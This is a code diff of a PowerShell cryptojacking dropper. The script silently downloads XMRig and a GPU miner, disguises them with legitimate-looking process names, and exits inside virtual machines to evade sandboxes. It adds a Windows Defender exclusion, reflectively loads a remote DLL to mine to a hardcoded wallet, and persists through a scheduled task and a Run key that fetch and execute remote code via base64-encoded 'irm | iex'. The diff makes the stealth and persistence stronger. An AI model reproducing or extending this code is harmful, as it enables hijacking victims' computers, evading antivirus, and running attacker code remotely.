@@ -4,120 +4,93 @@ $DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.d
 $MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
 $GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
 $Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
-$StealthDir = "$env:LOCALAPPDATA\Microsoft\Windows\UpdateCoord"# Robust Fetch Function (Bypasses WebClient restrictions)
+
+$ProcessNames = @("OneDriveStandalone", "TeamsDesktop", "ZoomManager", "DiscordUpdate", "EdgeBroker", "SpotifyHelper")
+$Name1 = ($ProcessNames | Get-Random) + ".exe"
+$Name2 = ($ProcessNames | Where-Object { $_ -ne $Name1 } | Get-Random) + ".exe"
+$StealthDir = "$env:LOCALAPPDATA\Microsoft\Windows\UpdateCoord"
+
+# ANTI-SANDBOX GUARD
+$Check = @((Get-WmiObject Win32_ComputerSystem).Model, (Get-WmiObject Win32_VideoController).Name) -join " "
+if ($Check -match "VirtualBox" -or $Check -match "VMware" -or $Check -match "VIRTUAL") { exit }
+if (Test-Path "C:\windows\System32\Drivers\VBoxMouse.sys") { exit }
+
 function Get-StealthFile($Url, $Path) {
+    $UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
     if (Test-Path $Path) { Remove-Item $Path -Force -ErrorAction SilentlyContinue }
-    
-    # Try Invoke-WebRequest (Modern PS)
-    try {
-        Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -ErrorAction Stop
-        if (Test-Path $Path) { return $true }
-    } catch { }
-
-    # Try curl (Standard Win 10/11 process fallback)
-    try {
-        if (Get-Command "curl.exe" -ErrorAction SilentlyContinue) {
-            curl.exe -L -o $Path $Url
-            if (Test-Path $Path) { return $true }
-        }
-    } catch { }
-
-    # Last resort: WebClient (Legacy)
-    try {
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-        $wc.DownloadFile($Url, $Path)
-        if (Test-Path $Path) { return $true }
-    } catch { }
-
+    try { Invoke-WebRequest -Uri $Url -OutFile $Path -UseBasicParsing -UserAgent $UA -ErrorAction Stop | Out-Null; return $true } catch { }
+    try { curl.exe -L -H "User-Agent: $UA" -o $Path $Url 2>$null; return $true } catch { }
+    try { Import-Module BitsTransfer; Start-BitsTransfer -Source $Url -Destination $Path; return $true } catch { }
     return $false
 }
 
-# 1. Prepare Directory
-if (-not (Test-Path $StealthDir)) {
-    New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
-}
+if (-not (Test-Path $StealthDir)) { New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null }
 
-# 2. Silent Exclusion (Admin Only Skip)
+try { powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c } catch { }
+
 try {
-    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    if ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
         Add-MpPreference -ExclusionPath $StealthDir -ErrorAction SilentlyContinue
     }
 } catch { }
 
-# 3. Setup Paths
 $CpuZip = Join-Path $StealthDir "upd_c.zip"
 $GpuZip = Join-Path $StealthDir "upd_g.zip"
-$CpuExe = Join-Path $StealthDir "svchost.exe"
-$GpuExe = Join-Path $StealthDir "Taskhostw.exe"
+$CpuExe = Join-Path $StealthDir $Name1
+$GpuExe = Join-Path $StealthDir $Name2
 
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-# 4. Download and Extract CPU Miner
 if (-not (Test-Path $CpuExe)) {
     if (Get-StealthFile $MinerUrl $CpuZip) {
-        Expand-Archive -Path $CpuZip -DestinationPath $StealthDir -Force
+        $shell = New-Object -ComObject Shell.Application
+        $shell.NameSpace($StealthDir).CopyHere($shell.NameSpace($CpuZip).Items(), 0x10)
         Remove-Item $CpuZip -Force
         $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
         if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $CpuExe -Force }
     }
 }
 
-# 5. GPU Detection and Download (ELITE: Universal 2GB+ Detection)
-$GpuDetected = $null
+# AGGRESSIVE GPU DETECTION (PRO-STRENGTH)
+$GpuDetected = $false
 try {
-    $vc = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
-    if ($vc) {
-        # Target ANY card with >2GB Dedicated RAM, ignoring basic display adapters
-        $GpuDetected = $vc | Where-Object { 
-            ($_.AdapterRAM -ge 2147483648) -and ($_.Name -notmatch "Microsoft Basic")
+    $Cards = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
+    foreach ($Card in $Cards) {
+        $N = $Card.Name.ToUpper()
+        if ($N -match "NVIDIA" -or $N -match "AMD" -or $N -match "RADEON" -or $N -match "RTX" -or $N -match "GTX" -or $Card.AdapterRAM -gt 2GB) {
+            if ($N -notmatch "MICROSOFT BASIC" -and $N -notmatch "DISPLAY") { $GpuDetected = $true; break }
         }
     }
 } catch { }
 
 if ($GpuDetected -and -not (Test-Path $GpuExe)) {
     if (Get-StealthFile $GpuMinerUrl $GpuZip) {
-        Expand-Archive -Path $GpuZip -DestinationPath $StealthDir -Force
+        $shell = New-Object -ComObject Shell.Application
+        $shell.NameSpace($StealthDir).CopyHere($shell.NameSpace($GpuZip).Items(), 0x10)
         Remove-Item $GpuZip -Force
         $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
         if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $GpuExe -Force }
     }
 }
 
-# 6. Load Bridge DLL and Start
-try {
-    $DllPath = Join-Path $StealthDir "Bridge.dll"
-    if (Get-StealthFile $DllUrl $DllPath) {
+$DllPath = Join-Path $StealthDir "Bridge.dll"
+if (Get-StealthFile $DllUrl $DllPath) {
+    try {
         $dllBytes = [System.IO.File]::ReadAllBytes($DllPath)
         $assembly = [System.Reflection.Assembly]::Load($dllBytes)
         $loader = $assembly.GetType("DateFundLoader")
         $startMethod = $loader.GetMethod("StartMiner")
+        $GArg = if ($GpuDetected) { $GpuExe } else { "" }
+        $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GArg, [string]$Wallet))
         
-        $GpuArg = if ($GpuDetected) { $GpuExe } else { "" }
-        $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GpuArg, [string]$Wallet))
+        $Command = "irm 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex"
+        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
+        $Encoded = [Convert]::ToBase64String($Bytes)
+        $TPath = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $Encoded"
         
-        # MOVE 3: Ghost Service Persistence (Deep Stealth)
-        $SvcName = "WinUpdateCoord"
-        $SvcPath = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"irm 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`""
-        
-        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-        if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-            if (-not (Get-Service $SvcName -ErrorAction SilentlyContinue)) {
-                # Create service using sc.exe for maximum compatibility
-                cmd.exe /c "sc create $SvcName binPath= \"$SvcPath\" start= auto displayname= \"Windows Update Coordinator\""
-                cmd.exe /c "sc description $SvcName \"Coordinates critical background system updates.\""
-                cmd.exe /c "sc start $SvcName"
-            }
+        if ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent().IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+            schtasks.exe /create /tn "Microsoft\Windows\WindowsUpdate\WindowsUpdateScan" /tr "$TPath" /sc onlogon /rl highest /f /ru "System"
+        } else {
+            schtasks.exe /create /tn "WindowsUpdateScan" /tr "$TPath" /sc onlogon /f
         }
-
-        # HKCU Run Registry key (Fallback / No Admin needed)
-        $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        $Name = "UpdateCoord"
-        $Value = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"irm 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex`"" 
-        Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
-        
-        Write-Host "running"
-    }
-} catch {
+        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCoord" -Value $TPath
+    } catch { }
 }
